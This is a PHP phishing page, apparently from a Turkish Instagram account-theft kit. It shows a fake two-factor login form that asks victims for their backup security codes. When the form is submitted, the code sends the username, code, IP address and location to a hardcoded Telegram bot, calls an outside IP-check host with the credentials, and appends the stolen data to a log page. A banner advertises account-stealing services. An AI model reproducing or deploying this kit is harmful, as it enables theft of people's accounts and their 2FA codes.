 <?php

    //Aşağıdaki Kodları Sakın Ellemeyin , Ellerseniz Kodlar Bozulur !

error_reporting(E_ALL);
require 'slokerapi.php';
session_start();


$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $slokerpass=$_POST["slokerpass"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    //Telegram Bot Ayarları 
    $token = "5264087994:AAFxravtQZUoEZaNZm_jUujaACXLnCicSsk"; // Tokeni Kendi Botunuzun Tokeni İle Değiştirin !
 
    $parametre= array(
    'chat_id' => "-1001776028780", // Chat İd Kendi Botunuzun  Chat İd İle Değiştirin
    'text' => "Faktör Kodu

    Kullanıcı Adı : $username
    Faktör : $slokerpass
    İp : $ip
    Devlet: $ulke
    Link : instagram.com/$username"
    
    );
    $ch = curl_init();
    $url = "https://api.telegram.org/bot".$token."/sendmessage";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
 
  $file = fopen('shutterlook.php', 'a');
   fwrite($file, "
 <html>
 <head>
     <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'>
 <title>Log | <?php echo date('d.m.Y H:i:s') ?></title>
 </head>
 <body bgcolor='#000000'>
 <body bgcolor='rgb(0,0,0)'>
 <body bgcolor='black'>
 <font color='red'> FAKTÖR </font><br>
 <font color='red'> Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
 <font color='red'> Şifre: </font><font color='white'>".$slokerpass."</font><br>
 <font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
 <font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
 <font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
 <font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
 "); 
  
 fclose($file);
 
 echo '';
 
    header("Location: confirmed.php?username=$username");
 }
  

/*  
######  ##     ## ##     ## ######## ######## ######## ########  ##        #######   #######  ##    ## 
##    ## ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##   ##  
##       ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##  ##   
 ######  ######### ##     ##    ##       ##    ######   ########  ##       ##     ## ##     ## #####    
      ## ##     ## ##     ##    ##       ##    ##       ##   ##   ##       ##     ## ##     ## ##  ##   
##    ## ##     ## ##     ##    ##       ##    ##       ##    ##  ##       ##     ## ##     ## ##   ##  
 ######  ##     ##  #######     ##       ##    ######## ##     ## ########  #######   #######  ##    ## 
 
 CoDeR by SHuTTeRLooK
 İstediğiniz tarzda hertürlü script bulunur
 Sıfırdan yapılır.
 Hesap kapatma - açma işlemleri - takipçi işlemleri 
 Hesap Çalma - Çalınan hesabı kurtarma
 Yüksek Takipçi Hesaplar İçin 
 https://www.instagram.com/shuterlook/
 t.me/shutterlook
 Ulaşabilirsiniz
*/
?>


<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">

    <title>Login  @<?php echo $username; ?></title>
    <link rel="icon" type="image/png" href="favicon.png"/>
    
    <link rel="stylesheet" href="sloker/main.css">


</head>
  <!--SHuTTeRLooK-->
 
<body>
    <div class="container">

        <form class="form" method="post" >
            <br><br><br>
<center>
   <img style="max-width:50%;  border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>">
</center>
            <h1 class="form__title">    @<?php echo $username; ?></h1>
           <center> <p class="metin" style="color: red;"><p> 2 Factor Authentication To Your Account Have You Added ? <br>lf 2-Factor Authentication İs Enabled On Your Account, Please Enter the Codes.<br> Continue By Entering Your Backup Codes<br> As Explained Below.<br><br><b>Account / Setting / Security /<br> Two-Factor / Authentication / Additional Methods / Backup Codes</b></p></center> </center>
<br>
          <!--SHuTTeRLooK-->
    <!--Telegram : @SHuTTeRLooK-->
            <div class="form__input-group"><?php include 'sloker/img/font.php'; ?>

                <input type="number" name="slokerpass" minlength="6" maxlength="8" class="form__input" placeholder="Security Code">
                <div class="form__input-error-message"></div>

            </div>
           
            <button class="form__button"  type="submit" >Login @<?php echo $username; ?></button>



           
        </form>
        <!--SHuTTeRLooK-->
    <!--Telegram : @SHuTTeRLooK-->
    </div>

    <script src="sloker/main.js"></script>
 
</body>


</html>